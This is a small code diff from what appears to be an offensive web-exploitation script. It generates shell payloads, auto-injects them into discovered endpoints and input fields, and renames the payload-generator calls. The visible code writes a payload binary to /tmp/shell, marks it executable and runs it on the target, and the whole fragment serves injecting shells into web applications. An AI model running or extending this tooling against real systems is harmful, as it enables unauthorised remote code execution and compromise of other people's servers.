@@ -66,9 +66,9 @@ print(monkey.get_js_endpoints())
 print(monkey.get_js_urls())
 
 if args.ptype == 'shell':
-    pl = generator.ishell()
+    pl = generator.ir_shell()
 elif args.ptype == 'bin':
-    pl_bin = generator.ibin()
+    pl_bin = generator.ir_bin()
     pl = f'printf "{pl_bin}" > /tmp/shell && chmod +x /tmp/shell && /tmp/shell'
 elif args.ptype == 'nc': # todo
     pass
@@ -85,7 +85,7 @@ if monkey.get_inputs() and not has_shell:
 
 if monkey.get_inputs() and not has_shell and (len(args.names) > 0):
     print("Injecting via endpoints with custom names")
-    shell = generator.ishell()
+    shell = generator.ir_shell()
     monkey.autoinject_urls()
 
 
